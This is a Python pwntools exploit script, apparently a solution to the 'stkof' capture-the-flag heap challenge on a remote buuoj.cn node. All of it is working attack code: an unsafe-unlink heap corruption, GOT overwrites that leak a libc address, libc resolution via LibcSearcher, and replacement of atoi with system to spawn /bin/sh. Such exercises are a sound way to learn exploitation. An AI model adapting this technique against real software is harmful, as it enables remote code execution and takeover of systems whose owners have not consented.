from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './stkof'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn', 28363) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
def add(size):
	sl('1')
	sl(str(size))
	ru('OK\n')

def delete(index):
	sl('3')
	sl(str(index))

def edit(index,content):
	sl('2')
	sl(str(index))
	sl(str(len(content)))
	s(content)
	ru('OK\n')

bag = 0x602140

add(0x80)
add(0x80)
add(0x80)
fd = bag+0x10-0x18
bk = bag+0x10-0x10
payload = flat(0,0x80,fd,bk).ljust(0x80,'a')
payload += flat(0x80,0x90)
edit(2,payload)
delete(3)

# bag[2] <-> bag[-1]
payload = flat('a'*0x10,elf.got['free'],elf.got['fflush'],elf.got['atoi'])
edit(2,payload)
edit(1,p64(elf.plt['puts']))
delete(2) # puts(GOT[fflush])
ru('OK\n')
fflush = uu64(r(6))
leak('fflush',fflush)
system,binsh = ret2libc(fflush,'fflush')
edit(3,p64(system))
sl('/bin/sh\x00')
# end

itr()